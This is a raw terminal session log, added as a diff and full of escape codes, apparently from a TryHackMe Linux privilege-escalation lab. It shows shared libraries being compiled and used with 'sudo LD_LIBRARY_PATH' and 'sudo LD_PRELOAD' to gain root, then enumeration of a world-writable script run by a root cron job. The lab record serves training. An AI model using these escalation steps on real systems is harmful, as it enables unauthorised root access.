+	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fdb43513000)
+	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fdb432d9000)
+	libpthread.so.0 => /lib/libpthread.so.0 (0x00007fdb430bd000)
+	libc.so.6 => /lib/libc.so.6 (0x00007fdb42d51000)
+	libuuid.so.1 => /lib/libuuid.so.1 (0x00007fdb42b4c000)
+	librt.so.1 => /lib/librt.so.1 (0x00007fdb42944000)
+	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fdb4270d000)
+	libdl.so.2 => /lib/libdl.so.2 (0x00007fdb42508000)
+	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fdb422e0000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fdb43bf4000)
+root@debian:/home/user# gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+root@debian:/home/user# sudo LD_LIBRARY_PATH=/tmp apache2[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kexit
+exit
+[?1049h[1;35r(B[m[4l[?7h[?12l[?25h[?1h=[?1h=[?1h=[39;49m[39;49m(B[m[H[2J(B[0;7m  GNU nano 2.2.4                                     New Buffer                                                                                 [34;1H^G(B[m Get Help[34;25H(B[0;7m^O(B[m WriteOut[34;49H(B[0;7m^R(B[m Read File[34;73H(B[0;7m^Y(B[m Prev Page[34;97H(B[0;7m^K(B[m Cut Text[34;121H(B[0;7m^C(B[m Cur Pos[35d(B[0;7m^X(B[m Exit[35;25H(B[0;7m^J(B[m Justify[35;49H(B[0;7m^W(B[m Where Is[35;73H(B[0;7m^V(B[m Next Page[35;97H(B[0;7m^U(B[m UnCut Text[35;121H(B[0;7m^T(B[m To Spell[3d[1;135H(B[0;7mModified[3d(B[mex [K[33d(B[0;7mSave modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                                                                                    [34;1H Y(B[m Yes[K[35d(B[0;7m N(B[m No  [35;17H(B[0;7m^C(B[m Cancel[K[33;62H[34d[J[35;144H[35;1H[?1049l[?1l>]0;user@debian: ~user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so nano[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksudo LD_LIBRARY_PATH=/tmp apache2
+apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
+root@debian:/home/user# cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+root@debian:/home/user# locate overwrite.sh
+locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 217.1 days)
+/usr/local/bin/overwrite.sh
+root@debian:/home/user# ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13  2017 [0m[01;32m/usr/local/bin/overwrite.sh[0m
+root@debian:/home/user# exit
+exit
+apache2: bad user name ${APACHE_RUN_USER}
+]0;user@debian: ~user@debian:~$ exit
+logout
+Connection to 10.10.166.44 closed.
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0msctip[K[K[Kript sto[K[K[K[K[K[K[K[K[K[K^C
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mls
+ReadMe.md  THMEWalkthough  hash.txt
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mstop
+
+Command 'stop' not found, but there are 18 similar ones.
+
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0msto psc[K[K[K[Kp script
+
+Command 'stop' not found, but there are 18 similar ones.
+
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mexitS[Kscript
+exitscript: command not found
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mexit script
+exit
+bash: exit: script: numeric argument required
+
+Script done on 2020-12-18 07:51:42-0500
